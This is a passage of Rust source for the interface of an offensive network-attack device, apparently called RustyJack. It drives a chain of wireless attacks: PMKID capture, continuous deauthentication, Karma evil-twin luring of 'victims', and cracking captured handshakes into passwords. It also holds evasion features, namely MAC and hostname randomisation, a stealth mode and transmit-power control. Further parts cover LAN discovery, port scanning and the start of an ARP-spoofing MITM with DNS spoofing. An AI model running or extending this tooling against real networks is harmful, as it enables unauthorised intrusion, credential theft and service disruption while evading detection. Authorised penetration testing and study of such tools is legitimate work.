                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 70)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Deauth attacks
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 45,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 55)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            4 => {
                // Step 5: Evil Twin/Karma
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
            }
            5 => {
                // Step 6: Crack passwords
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_core::cli::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((
                                    0,
                                    0,
                                    Some(password.to_string()),
                                    0,
                                    0,
                                ))));
                            }
                        }
                    }
                }
                return Ok(StepOutcome::Skipped(
                    "No captured handshake available to crack".to_string(),
                ));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Find the most recent handshake export file in loot directory
    fn find_recent_handshake(&self, loot_dir: &Path) -> Option<PathBuf> {
        let mut newest: Option<(PathBuf, std::time::SystemTime)> = None;

        fn scan_for_handshakes(dir: &Path, newest: &mut Option<(PathBuf, std::time::SystemTime)>) {
            if let Ok(entries) = fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        scan_for_handshakes(&path, newest);
                    } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("handshake_export_") && name.ends_with(".json") {
                            if let Ok(meta) = path.metadata() {
                                if let Ok(modified) = meta.modified() {
                                    if newest.as_ref().map(|(_, t)| modified > *t).unwrap_or(true) {
                                        *newest = Some((path.clone(), modified));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        scan_for_handshakes(loot_dir, &mut newest);
        newest.map(|(path, _)| path)
    }

    /// Toggle MAC randomization auto-enable setting
    fn toggle_mac_randomization(&mut self) -> Result<()> {
        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
        {
            return self.show_message("Stealth Mode", ["MAC setting locked while in Stealth mode"]);
        }
        self.config.settings.mac_randomization_enabled =
            !self.config.settings.mac_randomization_enabled;
        let enabled = self.config.settings.mac_randomization_enabled;
        self.bump_to_custom();

        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }

        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message(
            "MAC Randomization",
            [
                format!("Auto-randomize: {}", status),
                "".to_string(),
                if enabled {
                    "MAC will be randomized".to_string()
                } else {
                    "MAC will NOT be changed".to_string()
                },
                if enabled {
                    "before each attack.".to_string()
                } else {
                    "before attacks.".to_string()
                },
            ],
        )
    }

    fn toggle_hostname_randomization(&mut self) -> Result<()> {
        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
        {
            return self.show_message(
                "Stealth Mode",
                ["Hostname setting locked while in Stealth mode"],
            );
        }
        self.config.settings.hostname_randomization_enabled =
            !self.config.settings.hostname_randomization_enabled;
        let enabled = self.config.settings.hostname_randomization_enabled;
        self.bump_to_custom();

        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }

        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message(
            "Hostname Randomization",
            [
                format!("Auto hostname: {}", status),
                "".to_string(),
                if enabled {
                    "Hostname will be randomized".to_string()
                } else {
                    "Hostname will stay unchanged".to_string()
                },
                if enabled {
                    "before attacks.".to_string()
                } else {
                    "unless triggered manually.".to_string()
                },
            ],
        )
    }

    fn randomize_hostname_now(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Hostname", ["Linux-only operation"]);
        }

        #[cfg(target_os = "linux")]
        {
            self.show_progress("Hostname", ["Randomizing...", ""]);
            match self
                .core
                .dispatch(Commands::System(SystemCommand::RandomizeHostname))
            {
                Ok((msg, data)) => {
                    let name = data
                        .get("hostname")
                        .and_then(|v| v.as_str())
                        .unwrap_or("unknown");
                    self.show_message("Hostname", [msg, format!("New: {}", name)])
                }
                Err(e) => self.show_message("Hostname Error", [format!("{e}")]),
            }
        }
    }

    fn select_operation_mode(&mut self, mode: &str) -> Result<()> {
        let (title, warning) = match mode {
            "stealth" => (
                "Stealth Mode",
                [
                    "RX-only mode; traceable",
                    "scans/attacks blocked.",
                    "MAC+hostname auto-rand.",
                    "TX power lowered.",
                ],
            ),
            "aggressive" => (
                "Aggressive Mode",
                [
                    "Everything enabled.",
                    "High TX power, loud ops.",
                    "Use when stealth is",
                    "not a concern.",
                ],
            ),
            "default" => (
                "Default Mode",
                [
                    "Balanced settings.",
                    "Standard scans/attacks",
                    "allowed, moderate TX.",
                    "Adjust as needed.",
                ],
            ),
            "custom" => (
                "Custom Mode",
                [
                    "Keeps current toggles.",
                    "Adjust settings freely.",
                    "Use to fine-tune",
                    "behavior.",
                ],
            ),
            _ => {
                return self.show_message("Mode", ["Unknown mode"]);
            }
        };

        let options = vec!["Apply".to_string(), "Cancel".to_string()];
        self.show_message(title, warning)?;
        let choice = self.choose_from_list("Confirm Mode", &options)?;
        if choice != Some(0) {
            return Ok(());
        }

        self.apply_operation_mode(mode, true)
    }

    fn apply_operation_mode(&mut self, mode: &str, notify: bool) -> Result<()> {
        let settings = &mut self.config.settings;
        match mode {
            "stealth" => {
                settings.operation_mode = "stealth".to_string();
                settings.mac_randomization_enabled = true;
                settings.hostname_randomization_enabled = true;
                settings.passive_mode_enabled = true;
                settings.tx_power_level = "stealth".to_string();
            }
            "aggressive" => {
                settings.operation_mode = "aggressive".to_string();
                settings.mac_randomization_enabled = false;
                settings.hostname_randomization_enabled = false;
                settings.passive_mode_enabled = false;
                settings.tx_power_level = "maximum".to_string();
            }
            "default" => {
                settings.operation_mode = "default".to_string();
                settings.mac_randomization_enabled = false;
                settings.hostname_randomization_enabled = false;
                settings.passive_mode_enabled = false;
                settings.tx_power_level = "medium".to_string();
            }
            "custom" => {
                settings.operation_mode = "custom".to_string();
            }
            _ => return self.show_message("Mode", ["Unknown mode"]),
        }

        let config_path = self.root.join("gui_conf.json");
        let _ = self.config.save(&config_path);

        if notify {
            self.show_message(
                "Mode Applied",
                [
                    format!("Set mode: {}", self.mode_display_name()),
                    "Some settings may have".to_string(),
                    "changed automatically.".to_string(),
                ],
            )?;
        }
        Ok(())
    }

    fn mode_display_name(&self) -> String {
        self.mode_display(&self.config.settings.operation_mode)
    }

    fn mode_display(&self, mode: &str) -> String {
        match mode {
            "stealth" => "Stealth".to_string(),
            "aggressive" => "Aggressive".to_string(),
            "default" => "Default".to_string(),
            "custom" => "Custom".to_string(),
            other => other.to_string(),
        }
    }

    fn mode_allows_active(&mut self, context: &str) -> Result<bool> {
        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
        {
            self.show_message(
                "Stealth Mode",
                ["Active/traceable ops", "are blocked in stealth.", context],
            )?;
            return Ok(false);
        }
        Ok(true)
    }

    fn bump_to_custom(&mut self) {
        let mode = &self.config.settings.operation_mode;
        if mode.eq_ignore_ascii_case("default") || mode.eq_ignore_ascii_case("aggressive") {
            self.config.settings.operation_mode = "custom".to_string();
            let _ = self.config.save(&self.root.join("gui_conf.json"));
        }
    }

    fn apply_identity_hardening(&mut self) {
        #[cfg(target_os = "linux")]
        {
            let settings = self.config.settings.clone();
            let active_interface = settings.active_network_interface.clone();
            if settings.hostname_randomization_enabled {
                let _ = self
                    .core
                    .dispatch(Commands::System(SystemCommand::RandomizeHostname));
            }
            if settings.mac_randomization_enabled && !active_interface.is_empty() {
                let _ = randomize_mac_with_reconnect(&active_interface);
            }
        }
    }

    /// Toggle passive mode setting
    fn toggle_passive_mode(&mut self) -> Result<()> {
        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
        {
            return self.show_message(
                "Stealth Mode",
                ["Passive/active toggle locked in Stealth mode"],
            );
        }
        self.config.settings.passive_mode_enabled = !self.config.settings.passive_mode_enabled;
        let enabled = self.config.settings.passive_mode_enabled;
        self.bump_to_custom();

        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }

        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message(
            "Passive Mode",
            [
                format!("Passive mode: {}", status),
                "".to_string(),
                if enabled {
                    "Recon will use RX-only".to_string()
                } else {
                    "Normal TX/RX mode".to_string()
                },
                if enabled {
                    "No transmissions.".to_string()
                } else {
                    "will be used.".to_string()
                },
            ],
        )
    }

    /// Launch passive reconnaissance mode
    fn launch_passive_recon(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message(
                "Passive Recon",
                [
                    "No interface selected",
                    "",
                    "Run Hardware Detect",
                    "to select an interface.",
                ],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Recon Duration", &durations)?;

        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            Some(3) => 600,
            _ => return Ok(()),
        };

        self.show_progress(
            "Passive Recon",
            [
                "Starting passive mode...",
                "",
                "NO transmissions!",
                "Listening only.",
            ],
        )?;

        // In real implementation, this would call rustyjack-wireless passive mode
        // For now, show what it would do
        self.show_message(
            "Passive Recon",
            [
                &format!("Interface: {}", active_interface),
                &format!("Duration: {} sec", duration_secs),
                "",
                "Passive mode captures:",
                "- Beacon frames",
                "- Probe requests",
                "- Data (handshakes)",
                "",
                "Zero transmission mode",
            ],
        )
    }

    /// Randomize MAC address immediately
    fn randomize_mac_now(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message("Randomize MAC", ["No interface selected"]);
        }

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Randomize MAC", ["Supported on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            self.show_progress(
                "Randomize MAC",
                [
                    &format!("Interface: {}", active_interface),
                    "",
                    "Generating vendor-aware MAC...",
                ],
            )?;

            match randomize_mac_with_reconnect(&active_interface) {
                Ok((state, reconnect_ok)) => {
                    let original_mac = state.original_mac.to_string();
                    let new_mac = state.current_mac.to_string();

                    self.config.settings.original_macs
                        .entry(active_interface.clone())
                        .or_insert_with(|| original_mac.clone());
                    self.config.settings.current_macs
                        .insert(active_interface.clone(), new_mac.clone());
                    let config_path = self.root.join("gui_conf.json");
                    let _ = self.config.save(&config_path);

                    let mut lines = vec![
                        format!("Interface: {}", active_interface),
                        "".to_string(),
                        "New MAC:".to_string(),
                        new_mac,
                        "".to_string(),
                        "Original saved:".to_string(),
                        original_mac,
                        "".to_string(),
                    ];
                    
                    if reconnect_ok {
                        lines.push("DHCP renewed and".to_string());
                        lines.push("reconnect signaled.".to_string());
                    } else {
                        lines.push("Warning: reconnect may".to_string());
                        lines.push("have failed. Check DHCP.".to_string());
                    }

                    self.scrollable_text_viewer(
                        "MAC Randomized",
                        &lines,
                        false,
                    )
                }
                Err(e) => self.show_message(
                    "MAC Error",
                    [
                        "Failed to randomize MAC",
                        "",
                        &format!("{}", e),
                        "",
                        "Check permissions/driver.",
                    ],
                ),
            }
        }
    }

    /// Restore original MAC address
    fn set_vendor_mac(&mut self) -> Result<()> {
        let interface = self.config.settings.active_network_interface.clone();
        if interface.is_empty() {
            return self.show_message("MAC Address", ["No interface selected"]);
        }

        #[cfg(target_os = "linux")]
        {
            use rustyjack_evasion::{MacGenerationStrategy, MacManager, VENDOR_DATABASE};

            // Create vendor list for selection
            let mut vendors: Vec<String> = VENDOR_DATABASE
                .iter()
                .map(|v| format!("{} ({})", v.name, v.description))
                .collect();
            vendors.sort();

            let choice = self.choose_from_list("Select Vendor", &vendors)?;
            let Some(idx) = choice else {
                return Ok(());
            };

            // Find the selected vendor (since we sorted the display list, we need to find it again or sort the source)
            // Simpler: just sort the source list of references first
            let mut sorted_vendors: Vec<&rustyjack_evasion::VendorOui> =
                VENDOR_DATABASE.iter().collect();
            sorted_vendors.sort_by_key(|v| v.name);
            let selected_vendor = sorted_vendors[idx];

            self.show_progress("MAC Address", ["Setting vendor MAC...", "Please wait"]);

            let mut manager = MacManager::new().context("creating MacManager")?;
            manager.set_auto_restore(false);

            match manager.set_with_strategy(
                &interface,
                MacGenerationStrategy::Vendor(selected_vendor.name),
            ) {
                Ok(state) => {
                    let reconnect_ok = renew_dhcp_and_reconnect(&interface);
                    
                    let new_mac = state.current_mac.to_string();
                    self.config.settings.current_macs
                        .insert(interface.clone(), new_mac.clone());
                    let config_path = self.root.join("gui_conf.json");
                    let _ = self.config.save(&config_path);

                    let mut lines = vec![
                        format!("Set to {}", selected_vendor.name),
                        format!("New: {}", new_mac),
                    ];
                    
                    if !reconnect_ok {
                        lines.push("".to_string());
                        lines.push("Warning: reconnect may".to_string());
                        lines.push("have failed. Check DHCP.".to_string());
                    }

                    self.show_message(
                        "MAC Address",
                        lines.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
                    )?;
                }
                Err(e) => {
                    self.show_message("MAC Error", [shorten_for_display(&e.to_string(), 20)])?;
                }
            }
        }
        #[cfg(not(target_os = "linux"))]
        {
            self.show_message("MAC Address", ["Linux-only operation"])?;
        }
        Ok(())
    }

    fn restore_mac(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message("Restore MAC", ["No interface selected"]);
        }

        // Check if we have a saved original MAC
        let original_mac = if let Some(mac) = self.config.settings.original_macs.get(&active_interface) {
            mac.clone()
        } else {
            // Try to read the permanent hardware address
            let perm_path = format!("/sys/class/net/{}/address", active_interface);
            match std::fs::read_to_string(&perm_path) {
                Ok(mac) => mac.trim().to_uppercase(),
                Err(_) => {
                    return self.show_message(
                        "Restore MAC",
                        [
                            "No original MAC saved",
                            "",
                            "MAC was not changed by",
                            "RustyJack, or original",
                            "was not recorded.",
                        ],
                    );
                }
            }
        };

        self.show_progress("Restore MAC", [&format!("Restoring: {}", original_mac)])?;

        // Bring interface down
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "down"])
            .output();

        // Set original MAC
        let result = Command::new("ip")
            .args(["link", "set", &active_interface, "address", &original_mac])
            .output();

        // Bring interface back up
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "up"])
            .output();

        match result {
            Ok(output) if output.status.success() => {
                let reconnect_ok = renew_dhcp_and_reconnect(&active_interface);
                
                self.config.settings.current_macs.remove(&active_interface);
                self.config.settings.original_macs.remove(&active_interface);
                let config_path = self.root.join("gui_conf.json");
                let _ = self.config.save(&config_path);

                let interface_line = format!("Interface: {}", active_interface);
                let mac_line = format!("MAC: {}", original_mac);
                let mut lines = vec![
                    &interface_line,
                    "",
                    &mac_line,
                    "",
                ];
                
                if reconnect_ok {
                    lines.push("Original MAC restored.");
                } else {
                    lines.push("MAC restored.");
                    lines.push("Warning: reconnect may");
                    lines.push("have failed. Check DHCP.");
                }

                self.show_message("MAC Restored", lines)
            }
            Ok(_) => {
                self.show_message(
                    "Restore Error",
                    [
                        "Failed to restore MAC",
                        "",
                        "Try rebooting to reset",
                        "the interface.",
                    ],
                )
            }
            Err(_) => {
                self.show_message("Restore Error", ["Failed to execute", "restore command."])
            }
        }
    }

    /// Set TX power level
    fn set_tx_power(&mut self, level: TxPowerSetting) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
        {
            return self.show_message("Stealth Mode", ["TX power locked in Stealth mode"]);
        }

        if active_interface.is_empty() {
            return self.show_message("TX Power", ["No interface selected"]);
        }

        let (dbm, label) = match level {
            TxPowerSetting::Stealth => (1, "Stealth (1 dBm)"),
            TxPowerSetting::Low => (5, "Low (5 dBm)"),
            TxPowerSetting::Medium => (12, "Medium (12 dBm)"),
            TxPowerSetting::High => (18, "High (18 dBm)"),
            TxPowerSetting::Maximum => (30, "Maximum"),
        };

        self.bump_to_custom();
        self.show_progress("TX Power", [&format!("Setting to: {}", label)])?;

        // Try iw first (uses mBm)
        let result = Command::new("iw")
            .args([
                "dev",
                &active_interface,
                "set",
                "txpower",
                "fixed",
                &format!("{}00", dbm),
            ])
            .output();

        let success = if let Ok(out) = result {
            out.status.success()
        } else {
            // Try iwconfig as fallback
            let result2 = Command::new("iwconfig")
                .args([&active_interface, "txpower", &format!("{}", dbm)])
                .output();
            result2.map(|o| o.status.success()).unwrap_or(false)
        };

        if success {
            // Save selected power level
            let (_, key) = Self::tx_power_label(level);
            self.config.settings.tx_power_level = key.to_string();
            let _ = self.config.save(&self.root.join("gui_conf.json"));
            self.show_message(
                "TX Power Set",
                [
                    format!("Interface: {}", active_interface),
                    format!("Power: {}", label),
                    "".to_string(),
                    match level {
                        TxPowerSetting::Stealth => "Minimal range - stealth mode".to_string(),
                        TxPowerSetting::Low => "Short range operations".to_string(),
                        TxPowerSetting::Medium => "Balanced range/stealth".to_string(),
                        TxPowerSetting::High => "Normal operation range".to_string(),
                        TxPowerSetting::Maximum => "Maximum range".to_string(),
                    },
                ],
            )
        } else {
            self.show_message(
                "TX Power Error",
                [
                    "Failed to set power.".to_string(),
                    "".to_string(),
                    "Interface may not".to_string(),
                    "support TX power control.".to_string(),
                ],
            )
        }
    }

    /// Launch Ethernet device discovery scan
    fn launch_ethernet_discovery(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            if !self.mode_allows_active("Ethernet discovery blocked in Stealth mode")? {
                return Ok(());
            }
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message(
                    "Ethernet",
                    [
                        "No active interface set",
                        "",
                        "Set an Ethernet interface",
                        "as Active in Settings.",
                    ],
                );
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message(
                    "Ethernet",
                    [
                        &format!("Active iface: {}", active_interface),
                        "Not an Ethernet interface",
                        "",
                        "Set an Ethernet interface",
                        "as Active before scanning.",
                    ],
                );
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message(
                    "Ethernet",
                    [
                        &format!("Interface: {}", active_interface),
                        "Link is down / no cable",
                        "",
                        "Plug into a network and",
                        "try again.",
                    ],
                );
            }

            self.show_progress(
                "Ethernet Discovery",
                ["ICMP sweep on wired LAN", "Press Back to cancel"],
            )?;

            let args = EthernetDiscoverArgs {
                interface: Some(active_interface.clone()),
                target: None,
                timeout_ms: 500,
            };
            let cmd = Commands::Ethernet(EthernetCommand::Discover(args));

            if let Some((_, data)) = self.dispatch_cancellable("Ethernet Discovery", cmd, 30)? {
                let network = data
                    .get("network")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let interface = data
                    .get("interface")
                    .and_then(|v| v.as_str())
                    .unwrap_or("eth0");
                let hosts: Vec<String> = data
                    .get("hosts_found")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_str().map(ToString::to_string))
                            .collect()
                    })
                    .unwrap_or_default();
                let loot_path = data
                    .get("loot_path")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let detail = data
                    .get("hosts_detail")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();

                let mut lines = vec![
                    format!("Net: {}", network),
                    format!("Iface: {}", interface),
                    format!("Hosts: {}", hosts.len()),
                ];

                if !hosts.is_empty() {
                    let mut samples = Vec::new();
                    for host in detail.iter().take(3) {
                        if let Some(ip) = host.get("ip").and_then(|v| v.as_str()) {
                            let os = host.get("os_guess").and_then(|v| v.as_str()).unwrap_or("");
                            if os.is_empty() {
                                samples.push(ip.to_string());
                            } else {
                                samples.push(format!("{} ({})", ip, os));
                            }
                        }
                    }
                    if samples.is_empty() {
                        lines.push(format!(
                            "Sample: {}",
                            hosts.iter().take(3).cloned().collect::<Vec<_>>().join(", ")
                        ));
                    } else {
                        lines.push(format!("Sample: {}", samples.join(", ")));
                    }
                    if hosts.len() > 3 {
                        lines.push(format!("+{} more", hosts.len() - 3));
                    }
                }

                if let Some(path) = loot_path {
                    lines.push("Saved:".to_string());
                    lines.push(shorten_for_display(&path, 18));
                }

                self.show_message("Discovery Done", lines)?;
            }
            Ok(())
        }
    }

    /// Launch Ethernet port scan
    fn launch_ethernet_port_scan(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            if !self.mode_allows_active("Port scan blocked in Stealth mode")? {
                return Ok(());
            }
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message(
                    "Port Scan",
                    [
                        "No active interface set",
                        "",
                        "Set an Ethernet interface",
                        "as Active in Settings.",
                    ],
                );
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message(
                    "Port Scan",
                    [
                        &format!("Active iface: {}", active_interface),
                        "Not an Ethernet interface",
                        "",
                        "Set an Ethernet interface",
                        "as Active before scanning.",
                    ],
                );
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message(
                    "Port Scan",
                    [
                        &format!("Interface: {}", active_interface),
                        "Link is down / no cable",
                        "",
                        "Plug into a network and",
                        "try again.",
                    ],
                );
            }

            self.show_progress(
                "Ethernet Port Scan",
                ["Scanning target (gateway if unset)", "Select duration next"],
            )?;

            let duration_options = vec![
                ("Quick (0.5s/port)", 500u64),
                ("Normal (1s/port)", 1_000u64),
                ("Thorough (2s/port)", 2_000u64),
                ("Deep (5s/port)", 5_000u64),
            ];
            let labels: Vec<String> = duration_options
                .iter()
                .map(|(label, _)| label.to_string())
                .collect();
            let Some(choice) = self.choose_from_menu("Port Scan", &labels)? else {
                return Ok(());
            };
            let timeout_ms = duration_options
                .get(choice)
                .map(|(_, t)| *t)
                .unwrap_or(1_000);

            let args = EthernetPortScanArgs {
                target: None, // defaults to gateway
                interface: Some(active_interface.clone()),
                ports: None, // default common ports
                timeout_ms: timeout_ms,
            };
            let cmd = Commands::Ethernet(EthernetCommand::PortScan(args));

            // rough estimate: ports count * timeout + buffer (default ports ~15)
            let estimated_secs = ((15u64 * timeout_ms) / 1000).saturating_add(10);

            if let Some((_, data)) = self.dispatch_cancellable("Port Scan", cmd, estimated_secs)? {
                let target = data
                    .get("target")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let open_ports: Vec<u16> = data
                    .get("open_ports")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_u64().map(|p| p as u16))
                            .collect()
                    })
                    .unwrap_or_default();
                let loot_path = data
                    .get("loot_path")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let banners = data
                    .get("banners")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();

                let mut lines = vec![
                    format!("Target: {}", target),
                    format!("Open: {}", open_ports.len()),
                ];

                if !open_ports.is_empty() {
                    let preview: Vec<String> =
                        open_ports.iter().take(6).map(|p| p.to_string()).collect();
                    lines.push(preview.join(", "));
                    if open_ports.len() > 6 {
                        lines.push(format!("+{} more", open_ports.len() - 6));
                    }
                } else {
                    lines.push("No open ports found".to_string());
                }

                if !banners.is_empty() {
                    let mut preview = Vec::new();
                    for b in banners.iter().take(3) {
                        let port = b.get("port").and_then(|v| v.as_u64()).unwrap_or(0);
                        let banner = b
                            .get("banner")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .chars()
                            .take(40)
                            .collect::<String>();
                        preview.push(format!("{}: {}", port, banner));
                    }
                    lines.push("Banners:".to_string());
                    lines.extend(preview);
                    if banners.len() > 3 {
                        lines.push(format!("+{} more", banners.len() - 3));
                    }
                }

                if let Some(path) = loot_path {
                    lines.push("Saved:".to_string());
                    lines.push(shorten_for_display(&path, 18));
                }

                self.show_message("Port Scan Done", lines)?;
            }
            Ok(())
        }
    }

    /// Launch Ethernet device inventory (hostnames/services/OS hints)
    fn launch_ethernet_inventory(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            if !self.mode_allows_active("Inventory blocked in Stealth mode")? {
                return Ok(());
            }
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message(
                    "Inventory",
                    [
                        "No active interface set",
                        "",
                        "Set an Ethernet interface",
                        "as Active in Settings.",
                    ],
                );
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message(
                    "Inventory",
                    [
                        &format!("Active iface: {}", active_interface),
                        "Not an Ethernet interface",
                        "",
                        "Set an Ethernet interface",
                        "as Active before scanning.",
                    ],
                );
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message(
                    "Inventory",
                    [
                        &format!("Interface: {}", active_interface),
                        "Link is down / no cable",
                        "",
                        "Plug into a network and",
                        "try again.",
                    ],
                );
            }

            self.show_progress(
                "Inventory",
                ["Building device list...", "mDNS/LLMNR/NetBIOS/WSD"],
            )?;

            let args = EthernetInventoryArgs {
                interface: Some(active_interface.clone()),
                target: None,
                timeout_ms: 800,
            };
            let cmd = Commands::Ethernet(EthernetCommand::Inventory(args));

            if let Some((msg, data)) = self.dispatch_cancellable("Inventory", cmd, 60)? {
                let devices = data
                    .get("devices")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();
                let loot_path = data.get("loot_file").and_then(|v| v.as_str()).unwrap_or("");

                let mut lines = vec![msg.clone(), format!("Devices: {}", devices.len())];
                if !loot_path.is_empty() {
                    lines.push("Saved:".to_string());
                    lines.push(shorten_for_display(loot_path, 18));
                }
                self.show_message("Inventory Done", lines)?;

                if !devices.is_empty() {
                    self.browse_inventory(devices)?;
                }
            }
            Ok(())
        }
    }

    fn launch_ethernet_mitm(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet MITM", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            if !self.mode_allows_active("MITM/DNS spoof blocked in Stealth mode")? {
                return Ok(());
            }
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message(
                    "Ethernet MITM",
                    [
                        "No active interface set",
                        "",
                        "Set an Ethernet interface",
                        "as Active in Settings.",
                    ],
                );
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message(
                    "Ethernet MITM",
                    [
                        &format!("Active iface: {}", active_interface),
                        "Not an Ethernet interface",
                        "",
                        "Set an Ethernet interface",
                        "as Active before starting.",
                    ],
                );
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message(
                    "Ethernet MITM",
                    [
                        &format!("Interface: {}", active_interface),
                        "Link is down / no cable",
                        "",
                        "Plug into a network and",
                        "try again.",
                    ],
                );
            }

            let dns_sites = self.list_dnsspoof_sites();

            self.show_message(
                "MITM Warning",
                [
                    "Starts ARP spoof on LAN,",
                    "enables IP forwarding,",
                    "captures to PCAP under",
                    "loot/Ethernet/<target>/",
                    "",
                    "Optionally launches DNS",
                    "spoof + portal if picked.",
                    "Use only on authorized",
                    "networks.",
                ],
            )?;

            let mut options = vec!["Start MITM capture".to_string()];
            if !dns_sites.is_empty() {
                options.push("MITM + DNS spoof".to_string());
            }
            options.push("Cancel".to_string());

            let Some(choice) = self.choose_from_menu("Ethernet MITM", &options)? else {
                return Ok(());
            };

            let start_dns = choice == 1 && !dns_sites.is_empty();
            if options.len() == 2 && choice == 1 {
